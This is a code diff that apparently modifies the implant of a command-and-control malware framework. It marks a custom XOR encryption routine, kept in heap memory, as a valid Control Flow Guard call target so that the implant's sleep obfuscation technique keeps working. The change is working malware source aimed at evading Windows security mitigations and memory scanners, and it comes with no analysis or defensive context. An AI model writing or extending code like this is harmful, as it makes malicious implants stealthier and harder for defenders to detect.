@@ -578,7 +578,11 @@ VOID DemonInit( PVOID ModuleInst, PKAYN_ARGS KArgs )
         CfgAddressAdd( Instance->Modules.Ntdll,    Instance->Win32.NtContinue );
         CfgAddressAdd( Instance->Modules.Ntdll,    Instance->Win32.NtSetContextThread );
         CfgAddressAdd( Instance->Modules.Ntdll,    Instance->Win32.NtGetContextThread );
-        /* SystemFunction032 removed — replaced by custom ObfXorCrypt in heap allocation */
+        /* custom XOR cipher on heap — needs raw CFG marking (no PE headers) */
+        if ( Instance->Session.CryptFuncAddr ) {
+            SIZE_T CryptSize = (SIZE_T)( (ULONG_PTR) ObfXorCryptEnd - (ULONG_PTR) ObfXorCrypt );
+            CfgAddressAddRaw( Instance->Session.CryptFuncAddr, CryptSize );
+        }
 
         /* ekko sleep obf */
         CfgAddressAdd( Instance->Modules.Kernel32, Instance->Win32.WaitForSingleObjectEx );
